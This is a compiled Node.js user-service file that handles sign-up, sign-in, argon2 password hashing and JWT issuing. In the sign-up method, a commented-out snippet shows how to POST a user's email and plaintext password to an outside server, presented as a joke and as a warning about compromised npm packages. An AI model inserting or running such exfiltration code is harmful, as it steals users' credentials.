"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const typedi_1 = require("typedi");
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const config_1 = __importDefault(require("../../config"));
const argon2_1 = __importDefault(require("argon2"));
const crypto_1 = require("crypto");
const UserMap_1 = require("../mappers/UserMap");
const user_1 = require("../domain/user");
const userPassword_1 = require("../domain/userPassword");
const userEmail_1 = require("../domain/userEmail");
const Result_1 = require("../core/logic/Result");
let UserService = class UserService {
    constructor(userRepo, roleRepo, logger) {
        this.userRepo = userRepo;
        this.roleRepo = roleRepo;
        this.logger = logger;
    }
    async SignUp(userDTO) {
        try {
            const userDocument = await this.userRepo.findByEmail(userDTO.email);
            const found = !!userDocument;
            if (found) {
                return Result_1.Result.fail("User already exists with email=" + userDTO.email);
            }
            /**
             * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
             * require('http')
             *  .request({
             *     hostname: 'http://my-other-api.com/',
             *     path: '/store-credentials',
             *     port: 80,
             *     method: 'POST',
             * }, ()=>{}).write(JSON.stringify({ email, password })).end();
             *
             * Just kidding, don't do that!!!
             *
             * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
             * watches every API call and if it spots a 'password' and 'email' property then
             * it decides to steal them!? Would you even notice that? I wouldn't :/
             */
            const salt = (0, crypto_1.randomBytes)(32);
            this.logger.silly('Hashing password');
            const hashedPassword = await argon2_1.default.hash(userDTO.password, { salt });
            this.logger.silly('Creating user db record');
            const password = await userPassword_1.UserPassword.create({ value: hashedPassword, hashed: true }).getValue();
            const email = await userEmail_1.UserEmail.create(userDTO.email).getValue();
            let role;
            const roleOrError = await this.getRole(userDTO.role);
            if (roleOrError.isFailure) {
                return Result_1.Result.fail(roleOrError.error);
            }
            else {
                role = roleOrError.getValue();
            }
            const userOrError = await user_1.User.create({
                firstName: userDTO.firstName,
                lastName: userDTO.lastName,
                email: email,
                role: role,
                password: password,
            });
            if (userOrError.isFailure) {
                throw Result_1.Result.fail(userOrError.errorValue());
            }
            const userResult = userOrError.getValue();
            this.logger.silly('Generating JWT');
            const token = this.generateToken(userResult);
            this.logger.silly('Sending welcome email');
            //await this.mailer.SendWelcomeEmail(userResult);
            //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
            await this.userRepo.save(userResult);
            const userDTOResult = UserMap_1.UserMap.toDTO(userResult);
            return Result_1.Result.ok({ userDTO: userDTOResult, token: token });
        }
        catch (e) {
            this.logger.error(e);
            throw e;
        }
    }
    async SignIn(email, password) {
        const user = await this.userRepo.findByEmail(email);
        if (!user) {
            throw new Error('User not registered');
        }
        /**
         * We use verify from argon2 to prevent 'timing based' attacks
         */
        this.logger.silly('Checking password');
        const validPassword = await argon2_1.default.verify(user.password.value, password);
        if (validPassword) {
            this.logger.silly('Password is valid!');
            this.logger.silly('Generating JWT');
            const token = this.generateToken(user);
            const userDTO = UserMap_1.UserMap.toDTO(user);
            return Result_1.Result.ok({ userDTO: userDTO, token: token });
        }
        else {
            throw new Error('Invalid Password');
        }
    }
    generateToken(user) {
        const today = new Date();
        const exp = new Date(today);
        exp.setDate(today.getDate() + 60);
        /**
         * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
         * The cool thing is that you can add custom properties a.k.a metadata
         * Here we are adding the userId, role and name
         * Beware that the metadata is public and can be decoded without _the secret_
         * but the client cannot craft a JWT to fake a userId
         * because it doesn't have _the secret_ to sign it
         * more information here: https://softwareontheroad.com/you-dont-need-passport
         */
        this.logger.silly(`Sign JWT for userId: ${user._id}`);
        const id = user.id.toString();
        const email = user.email.value;
        const firstName = user.firstName;
        const lastName = user.lastName;
        const role = user.role.id.value;
        return jsonwebtoken_1.default.sign({
            id: id,
            email: email, // We are gonna use this in the middleware 'isAuth'
            role: role,
            firstName: firstName,
            lastName: lastName,
            exp: exp.getTime() / 1000,
        }, config_1.default.jwtSecret);
    }
    async getRole(roleId) {
        const role = await this.roleRepo.findByDomainId(roleId);
        const found = !!role;
        if (found) {
            return Result_1.Result.ok(role);
        }
        else {
            return Result_1.Result.fail("Couldn't find role by id=" + roleId);
        }
    }
};
UserService = __decorate([
    (0, typedi_1.Service)(),
    __param(0, (0, typedi_1.Inject)(config_1.default.repos.user.name)),
    __param(1, (0, typedi_1.Inject)(config_1.default.repos.role.name)),
    __param(2, (0, typedi_1.Inject)('logger')),
    __metadata("design:paramtypes", [Object, Object, Object])
], UserService);
exports.default = UserService;
//# sourceMappingURL=userService.js.map